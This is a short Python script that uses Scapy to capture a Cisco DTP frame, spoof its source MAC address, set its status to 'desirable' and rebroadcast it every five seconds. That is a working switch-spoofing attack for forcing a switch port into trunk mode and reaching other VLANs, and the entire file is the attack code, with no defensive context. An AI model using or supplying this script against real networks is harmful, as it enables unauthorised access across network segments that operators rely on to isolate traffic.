#!/usr/bin/env python3  

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
#                                                                               # 
#                                                                               # 
#                                                                               # 
#     a python Script to DTP ( Dynamique Trunking Protocl) packets              # 
#                                                                               # 
#                                                                               # 
#                                                                               # 
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #

#Import Scapy
from scapy.all import *

# import The Time Module 
import time 

#Import DTP
load_contrib("dtp")
#Capture DTP frame
pkt = sniff(filter="ether dst 01:00:0c:cc:cc:cc",count=1)    
#Change the MAC address
pkt[0].src="00:00:00:11:11:11" 
#Change to desirable
pkt[0][DTP][DTPStatus].status='\x03'


# define an infinit loop to act as real Swicth  

while True : 
	#Send frame into network
	sendp(pkt[0], loop=0, verbose=1)

	time.sleep(5) # define a timer do break the loop for 5 seconds 


